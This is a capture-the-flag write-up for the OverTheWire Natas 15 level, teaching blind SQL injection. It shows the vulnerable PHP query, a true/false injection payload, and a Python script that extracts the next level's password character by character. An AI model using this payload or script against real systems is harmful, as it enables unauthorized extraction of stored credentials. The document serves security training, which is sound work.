# Write-up: Natas 15 → 16  
**Date:** 2025-12-26  

## Obfuscated password (ROT13)  
``

---

## OBJECTIVE

> Use blind SQL injection to extract the password for the user `natas16`, even though the application does not display any direct SQL results.

---

## PURPOSE

This level teaches a critical web security concept: **blind SQL injection**. Unlike previous SQLi challenges that echo query results directly, this level returns only a binary answer (“This user exists” or “This user doesn't exist”) — meaning we must infer data through **true/false conditions**.

It demonstrates the risk of unsafe string concatenation in SQL statements and reinforces the importance of proper sanitization and parameterized queries.

---

## SOLUTION

The vulnerable PHP code is:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```

This is a classic example of unsanitized user input leading to SQL injection.

The key trick is that if the `SELECT` query returns any rows, the app tells us “This user exists.” If no rows match, we see “This user doesn't exist.” This allows us to **test one character at a time** of the target password.

We send a crafted input like:

```
natas16" AND BINARY SUBSTRING(password,1,1)="a" #
```

If the first character of the password is `'a'`, the query evaluates to true, and we get confirmation. Otherwise, we try another character.

Using this idea, we brute-force the password character by character. A Python script automates this:

```python
import requests
from string import ascii_letters, digits

charset = ascii_letters + digits
url = "http://natas15.natas.labs.overthewire.org/"
auth = ("natas15", "YOUR_PASSWORD_HERE")  # Replace with real credentials

found = ""
while len(found) < 32:
    for char in charset:
        injection = f'natas16" AND BINARY SUBSTRING(password,{len(found)+1},1)="{char}" #'
        r = requests.post(url, auth=auth, data={"username": injection})
        if "This user exists" in r.text:
            found += char
            print(f"[+] {len(found)} chars: {found}")
            break
```

- The script tests all letters and digits in `charset`.
- The `BINARY` keyword ensures case sensitivity.
- It halts after 32 characters, which is the known password length.

Once complete, the password for `natas16` is revealed.

---

## TAKEAWAYS

---

Writeup author: **Jeremy Ray Jewell**  
GitHub: https://github.com/jeremyrayjewell  
LinkedIn: https://www.linkedin.com/in/jeremyrayjewell
